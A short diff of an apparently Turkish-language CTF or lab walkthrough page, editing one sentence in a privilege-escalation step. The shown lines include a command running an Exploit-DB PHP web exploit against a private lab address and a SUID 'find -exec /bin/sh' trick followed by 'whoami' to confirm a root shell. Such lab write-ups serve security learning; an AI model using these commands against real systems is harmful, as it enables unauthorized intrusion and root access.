@@ -210,7 +210,7 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 /sbin/mount.nfs
 </pre>
 
-<p>Bingo! find aracının çok şükürki -exec parametresi var. Bunu sömürebiliriz. </p>
+<p>Bingo! find aracının -exec parametresi var. Bunu sömürebiliriz. Konudan bağımsız isthiza'da da dediği gibi exec şeytani bir fonksiyondur! </p>
 <pre>find -exec '/bin/sh' \;</pre>
 <pre>whoami</pre>
 <pre>
